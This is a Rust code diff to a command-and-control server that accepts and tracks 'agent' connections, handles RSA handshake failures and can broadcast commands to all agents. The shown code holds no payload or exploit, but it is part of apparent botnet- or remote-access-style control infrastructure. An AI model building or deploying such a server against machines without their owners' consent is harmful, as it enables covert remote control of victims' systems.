@@ -1,13 +1,13 @@
 use std::collections::HashMap;
 use std::io;
 use std::sync::Arc;
-use tokio::io::AsyncWriteExt;
+// use tokio::io::AsyncWriteExt;
 // use tokio::io::{AsyncWriteExt, Interest};
 use tokio::net::TcpListener;
 use tokio::sync::Mutex;
 
 use crate::crypto;
-use crate::socket::{SocketState, SocketStream};
+use crate::socket::{HandleErrors, SocketState, SocketStream};
 use rand::prelude::*;
 
 pub struct Server {
@@ -24,23 +24,20 @@ impl Server {
     }
 
     pub async fn assign_new_socket(&mut self, socket: SocketStream) {
+        // Acquire a mutex lock on the streams property so we can
+        // mutate it safely.
         let streams = Arc::clone(&self.streams);
         let mut streams_lock = streams.lock().await;
 
+        // Generate a random ID to assign to the socket
         let new_socket_id = generate_random_num();
 
         streams_lock.insert(new_socket_id, Arc::new(Mutex::new(socket)));
 
-        // FIRE HANDSHAKE SERVER_HELLO so we can keep on going from handle_msg.
-        // let my_new_stream = Arc::clone(&streams_lock.get(&new_socket_id).unwrap().stream);
-        // let mut my_new_lock = my_new_stream.lock().await;
-        // my_new_lock.write_all(&b"HANDSHAKE".to_vec()).await.unwrap();
-        // std::mem::drop(my_new_lock);
-
         self.read_new_socket(new_socket_id).await.unwrap();
     }
 
-    pub async fn broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<i32>> {
+    pub async fn _broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<i32>> {
         // Todo find better namings for everything here lmao
         let mut failed_broadcasts: Vec<i32> = Vec::new();
         let streams = Arc::clone(&self.streams);
@@ -76,7 +73,6 @@ impl Server {
 
     pub async fn read_new_socket(&mut self, id: i32) -> io::Result<()> {
         // A loop which reads messages from the CnC
-        // server.assign_new_stream(stream: SocketStream)
         let my_streams = Arc::clone(&self.streams);
         tokio::spawn(async move {
             loop {
@@ -87,6 +83,7 @@ impl Server {
                 let mut lock = my_socket.lock().await;
                 let msg = lock.consume_message().await;
 
+                // Match the msg output, an error isn't necessarily bad, just ConnectionReset is. (for now)
                 match msg {
                     Err(e) if e.kind() == std::io::ErrorKind::ConnectionReset => {
                         println!("Agent disconnected");
@@ -95,7 +92,25 @@ impl Server {
                         break;
                     }
                     Ok((msg, n_bytes)) => {
-                        lock.handle_msg(msg, n_bytes).await;
+                        let handle_res = lock.handle_msg(msg, n_bytes).await;
+
+                        match handle_res {
+                            // Errors in handle_msg can be deadly for the connection
+                            // stuff like unsynced cryptographic keys requires a connection shutdown
+                            // as soon as possible.
+                            Err(e) => {
+                                // e should represent the peer
+                                match e {
+                                    HandleErrors::BadHandshakeFormat(addr)
+                                    | HandleErrors::BadHandshakeRSA(addr) => {
+                                        println!("Critical agent error! Closing connection and removing! peer: {:?}", addr);
+                                        streams.remove(&id);
+                                        break;
+                                    }
+                                }
+                            }
+                            Ok(_) => {}
+                        }
                     }
                     _ => {}
                 }
@@ -113,7 +128,9 @@ pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) 
         loop {
             let (socket, _) = listener.accept().await.unwrap();
             let socket = SocketStream::new(socket);
+            // acquire a mutex lock on the server struct so we can mutate it's values safely.
             let mut lock = my_server.lock().await;
+            // Cache the SocketStream along with it's connection for further usage such as command broadcasting to multiple agents.
             lock.assign_new_socket(socket).await;
         }
     });
@@ -121,6 +138,9 @@ pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) 
     Ok(())
 }
 
+// We want each agent to have an ID just so it will be easier to identify them 
+// later on.
+// this method generates a random number between 1 - 100,000
 pub fn generate_random_num() -> i32 {
     let mut rng = rand::thread_rng();
     let mut nums: Vec<i32> = (1..100000).collect();
